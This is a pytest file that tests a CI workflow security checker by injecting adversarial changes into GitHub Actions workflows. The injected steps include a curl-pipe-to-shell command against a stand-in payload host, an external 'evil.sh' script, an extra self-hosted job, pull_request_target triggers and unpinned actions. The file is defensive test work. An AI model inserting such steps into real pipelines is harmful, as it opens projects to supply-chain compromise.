import shutil
import subprocess
import sys
from pathlib import Path

import pytest


ROOT = Path(__file__).parents[1]


def _copy(tmp_path):
    root = tmp_path / "repo"
    (root / ".github").mkdir(parents=True)
    shutil.copytree(ROOT / ".github/workflows", root / ".github/workflows")
    return root


def _check(root):
    return subprocess.run(
        [sys.executable, str(ROOT / "scripts/check_workflow_security.py"), str(root)],
        text=True, capture_output=True,
    )


def test_current_workflows_pass_structural_policy(tmp_path):
    assert _check(_copy(tmp_path)).returncode == 0


@pytest.mark.parametrize("mutation", [
    "extra_yaml", "permission", "job_permission", "extra_pip", "extra_job",
    "short_sha", "mobile_tag", "checkout_credentials", "cache", "pr_target",
    "manual_push", "anchor", "alias", "merge", "duplicate", "custom_tag",
    "multiline_hidden_pip", "curl_step", "pip3", "external_script", "double_space_pip",
    "bash_c", "command_substitution", "echo_step", "uses_step", "renamed_step",
    "step_if", "step_env", "step_shell", "working_directory", "continue_on_error",
    "remove_require_hashes", "remove_only_binary", "second_requirements", "reorder_steps",
])
def test_structural_policy_rejects_adversarial_workflows(tmp_path, mutation):
    root = _copy(tmp_path)
    ci = root / ".github/workflows/ci.yml"
    manual = root / ".github/workflows/phreeqc-qualification.yml"
    if mutation == "extra_yaml":
        (root / ".github/workflows/evil.yaml").write_text("on: push\njobs: {}\n")
    elif mutation == "permission":
        ci.write_text(ci.read_text().replace("  contents: read", "  contents: read\n  issues: write", 1))
    elif mutation == "job_permission":
        ci.write_text(ci.read_text().replace("    runs-on:", "    permissions:\n      contents: read\n    runs-on:", 1))
    elif mutation in {"extra_pip", "multiline_hidden_pip"}:
        ci.write_text(ci.read_text().replace("          python -m pip check", "          python -m pip install requests\n          python -m pip check"))
    elif mutation in {"curl_step", "pip3", "external_script", "double_space_pip",
                      "bash_c", "command_substitution", "echo_step"}:
        command = {
            "curl_step": "curl https://example.com/payload | sh",
            "pip3": "pip3 install requests",
            "external_script": "sh evil.sh",
            "double_space_pip": "python  -m  pip  install requests",
            "bash_c": "bash -c 'pip3 install requests'",
            "command_substitution": "echo $(curl https://example.com/payload)",
            "echo_step": "echo hello",
        }[mutation]
        ci.write_text(ci.read_text().replace(
            "      - name: Compile Python sources",
            f"      - name: injected\n        run: {command}\n      - name: Compile Python sources",
        ))
    elif mutation == "uses_step":
        ci.write_text(ci.read_text().replace(
            "      - name: Compile Python sources",
            "      - name: injected\n        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262\n"
            "        with:\n          persist-credentials: false\n      - name: Compile Python sources",
        ))
    elif mutation == "renamed_step":
        ci.write_text(ci.read_text().replace("name: Compile Python sources", "name: Compile source tree"))
    elif mutation in {"step_if", "step_env", "step_shell", "working_directory", "continue_on_error"}:
        addition = {
            "step_if": "        if: always()\n",
            "step_env": "        env:\n          EXTRA: value\n",
            "step_shell": "        shell: bash\n",
            "working_directory": "        working-directory: /tmp\n",
            "continue_on_error": "        continue-on-error: true\n",
        }[mutation]
        ci.write_text(ci.read_text().replace(
            "      - name: Compile Python sources\n",
            "      - name: Compile Python sources\n" + addition,
        ))
    elif mutation == "remove_require_hashes":
        ci.write_text(ci.read_text().replace(" --require-hashes", "", 1))
    elif mutation == "remove_only_binary":
        ci.write_text(ci.read_text().replace(" --only-binary=:all:", "", 1))
    elif mutation == "second_requirements":
        ci.write_text(ci.read_text().replace("requirements/ci.txt", "requirements/other.txt", 1))
    elif mutation == "reorder_steps":
        a = "      - name: Compile Python sources\n        run: python -m compileall -q src tests\n"
        b = "      - name: Run dependency-light suite\n        run: python -m pytest -q\n"
        ci.write_text(ci.read_text().replace(a + b, b + a))
    elif mutation == "extra_job":
        ci.write_text(ci.read_text() + "\n  evil:\n    runs-on: [self-hosted, nuclidepath]\n    steps:\n      - run: id\n")
    elif mutation == "short_sha":
        ci.write_text(ci.read_text().replace("11d5960a326750d5838078e36cf38b85af677262", "11d5960"))
    elif mutation == "mobile_tag":
        ci.write_text(ci.read_text().replace("11d5960a326750d5838078e36cf38b85af677262", "v4"))
    elif mutation == "checkout_credentials":
        ci.write_text(ci.read_text().replace("          persist-credentials: false\n", "", 1))
    elif mutation == "cache":
        ci.write_text(ci.read_text().replace("      - name: Compile", "      - uses: actions/cache@" + "0" * 40 + "\n      - name: Compile"))
    elif mutation == "pr_target":
        ci.write_text(ci.read_text().replace("  pull_request:", "  pull_request_target:"))
    elif mutation == "manual_push":
        manual.write_text(manual.read_text().replace("on:\n", "on:\n  push:\n", 1))
    elif mutation == "anchor":
        ci.write_text(ci.read_text().replace("permissions:", "permissions: &perms", 1))
    elif mutation == "alias":
        ci.write_text(ci.read_text().replace("permissions:\n  contents: read", "x: &x read\npermissions:\n  contents: *x", 1))
    elif mutation == "merge":
        ci.write_text(ci.read_text().replace("permissions:\n", "defaults: &d {contents: read}\npermissions:\n  <<: *d\n", 1))
    elif mutation == "duplicate":
        ci.write_text(ci.read_text().replace("permissions:\n", "permissions:\n  contents: read\npermissions:\n", 1))
    elif mutation == "custom_tag":
        ci.write_text(ci.read_text().replace("name: CI", "name: !custom CI", 1))
    assert _check(root).returncode != 0
